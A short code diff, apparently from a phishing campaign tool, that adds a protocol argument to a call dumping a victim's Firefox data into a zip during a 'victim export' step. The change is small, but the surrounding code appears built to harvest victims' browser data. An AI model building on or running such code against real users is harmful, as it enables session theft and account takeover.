@@ -672,6 +672,7 @@ async def export_victim(
             firefox_zip_size = await dump_firefox_data(
                 f"{campaign.container_name}-{victim_id}",
                 firefox_zip_path,
+                protocol=campaign.protocol,
                 max_bytes=available_bytes,
             )
             if firefox_zip_size is not None:
